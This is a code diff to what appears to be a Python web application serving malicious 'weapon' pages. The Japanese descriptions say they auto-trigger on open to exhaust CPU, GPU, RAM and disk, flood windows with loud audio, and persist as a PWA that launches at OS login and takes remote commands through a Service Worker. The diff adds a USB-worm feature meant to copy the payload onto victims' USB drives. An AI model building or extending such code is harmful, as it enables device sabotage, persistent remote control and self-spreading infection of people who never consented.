@@ -39,7 +39,7 @@
   windows        爆音窓爆弾（音＋大量ウィンドウ）
   storage        容量枯渇
   mix            全部ミックス
-  singularity    特異点（全15系統統合の最上位兵器・PWA常駐）
+  singularity    特異点（全16系統統合の最上位兵器・PWA常駐・USBワーム）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
@@ -90,7 +90,7 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": "全15系統・5資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。監視室からレベル0〜5を遠隔変更できる。",
+    "singularity": "全16系統・5資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜5を遠隔変更できる。",
 }
 
 # 常駐（ホーム画面追加）で自動発射するモード
@@ -109,7 +109,7 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。",
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -868,6 +868,9 @@ def _sg_land(code, request, sid=""):
         "wipe": wipe, "avName": app_name,
         "install": os.getenv("SG_INSTALL", "auto"),
         "installLevel": _SG_INSTALL_LEVEL,
+        # --- USBワーム（相手のUSBを再武装させる） ---
+        "code": code, "usbCode": code, "usbWorm": True, "usbBase": "",
+        "usbLabel": app_name,
     }
     resp = _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
                    link=dict(row), ref=ref, level=lv,
